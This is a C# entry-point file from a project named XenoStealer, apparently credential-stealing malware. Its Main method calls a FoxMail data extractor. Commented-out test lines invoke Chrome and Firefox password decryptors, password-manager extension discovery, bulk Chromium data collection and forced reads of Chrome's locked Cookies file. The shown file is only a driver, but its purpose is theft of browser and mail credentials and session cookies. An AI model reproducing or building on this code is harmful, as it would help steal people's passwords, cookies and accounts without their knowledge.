using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using XenoStealer;
using XenoStealer.DataExtraction.Applications;

namespace XenoStealer
{
    class Program
    {
        public static void Main(string[] args)
        {
            //var BASENAME=GeckoDecryptor.GetMOZAPPBASENAMEFromProfilePath(@"C:\Users\moom825\AppData\Roaming\Mozilla\Firefox\Profiles\q2pa8ef9.default-release");
            //

            //new test().blah();

            //ChromeDecryptor a = new ChromeDecryptor(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data");
            //
            //var t=Chromium.GetPasswordManagerExtensions(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default");

            //GeckoDecryptor a = new GeckoDecryptor(Configuration.GeckoLibraryPaths["Firefox"]);
            //var t=Chromium.GetAllInfo(DataExtractionStructs.ChromiumBrowserOptions.All);

            FoxMail.GetInfo();
            var y = 0;
            //Utils.GetProcessLockingFile(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies", out var asd);

            
            //byte[] data=Utils.ForceReadFile(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies");
            //bool h = g;

        }
    }
}